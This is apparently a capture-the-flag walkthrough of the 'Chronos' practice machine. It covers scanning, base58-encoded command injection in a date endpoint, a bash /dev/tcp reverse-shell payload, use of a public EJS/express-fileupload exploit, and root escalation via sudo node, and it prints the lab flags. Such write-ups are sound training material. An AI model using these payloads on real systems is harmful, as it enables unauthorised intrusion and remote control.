root@kali ~/D/C/CHRONOS# nmap -sS -A -T4 -p- 10.0.0.18

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:f2:83:a4:38:89:8d:86:a5:e1:31:76:eb:9d:5f:ea (RSA)
|   256 41:5a:21:c4:58:f2:2b:e4:8a:2f:31:73:ce:fd:37:ad (ECDSA)
|_  256 9b:34:28:c2:b9:33:4b:37:d5:01:30:6f:87:c4:6b:23 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-open-proxy: Proxy might be redirecting requests
|_http-cors: HEAD GET POST PUT DELETE PATCH

Going to http://10.0.0.18, we don't have functionaly, comments or anything that might help us, brute forcing the directories doesn't find anything either.
Going to http://10.0.0.18:8000 and looking at it's source code we find in the <script> tag this line:

http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL

Adding "10.0.0.18 chronos.local" to /etc/hosts and by going to the specified url, it seems we don't have permission to access this page.
Going to http://chronos.local:8000 we can see that the date and time is being specified, probably the 'date' command used in Linux.
We can try to decode the string that is been passed in the url, it seems like base64 but it's base58.

4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL Base58 Decode:

'+Today is %A, %B %d, %Y %H:%M:%S.'

%A - Day
%B - Month
%d - day (number_
%Y - Year
%H - Hour
%M - Minute
%S - Second

Turns out, this string format can be used with the 'date' command in Linux.

root@kali ~/D/C/CHRONOS# date '+Today is %A, %B %d, %Y %H:%M:%S.'
Today is Sunday, February 27, 2022 15:13:49.

This means we can inject a command and start a reverse shell.
By running date ;bash -c 'bash -i >& /dev/tcp/10.0.0.27/4444 0>&1' we can open a reverse shell on our local machine. All we need to do is decode the command and pass it in the url.

;bash -c 'bash -i >& /dev/tcp/10.0.0.27/4444 0>&1'

Base58 Encode:
jSQFn3DG86mbq9wJvQ3UZztDFRqBaqKWp7w5ghvh2eChdyAGQsPJeHXYmg6ECpV2itHc

http://chronos.local:8000/date?format=jSQFn3DG86mbq9wJvQ3UZztDFRqBaqKWp7w5ghvh2eChdyAGQsPJeHXYmg6ECpV2itHc

We are logged in as the 'www-data' user. We cannot run commands as root and there are no usefull SUID files on the machine. Going to the home directory we can find a user ---> 'imera'. We don't have permissions to view the directory.
At this point I got stuck for a bit, I searched for some expliots but found none. After some digging around I found that by going to /opt/chronos-v2/backend and by reading the file package.json:

/opt/chronos-v2/backend/package.json:
{
  "name": "some-website",
  "version": "1.0.0",
  "description": "",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "ejs": "^3.1.5",
    "express": "^4.17.1",
    "express-fileupload": "^1.1.7-alpha.3"
  }
}

It stats the "express-fileupload" is being used. express-fileupload is a way to upload and download files in Node.js. I of course searched if it has any vulnerabilites and found this github repository https://github.com/boiledsteak/EJS-Exploit.

By downloading and executing the expliot on victim machine and listening on my local machine, we are able to get a reverse shell as the user 'imera'.

Victim Machine:

www-data@chronos:/tmp$ python3 expliot.py
Starting Attack...
Finished!

Local Machine:

root@kali ~/D/C/CHRONOS# nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.0.0.27] from (UNKNOWN) [10.0.0.18] 51854
imera@chronos:/opt/chronos-v2/backend$ 

We now have permission to go the /home/imera directory and read user.txt.

user.txt:                                                                                              
byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK

Let's see if the user is part of the sudo group.

imera@chronos:/opt/chronos-v2/backend$ sudo -l
User imera may run the following commands on chronos:
    (ALL) NOPASSWD: /usr/local/bin/npm *
    (ALL) NOPASSWD: /usr/local/bin/node *

I searched online for 'linux node command privilege escalation' and found an article from GTFOBins https://gtfobins.github.io/gtfobins/node/.

Can use the command sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})' to spawn a root shell.

imera@chronos:~$ sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
<child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cat root.txt
YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK

root.txt:
YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK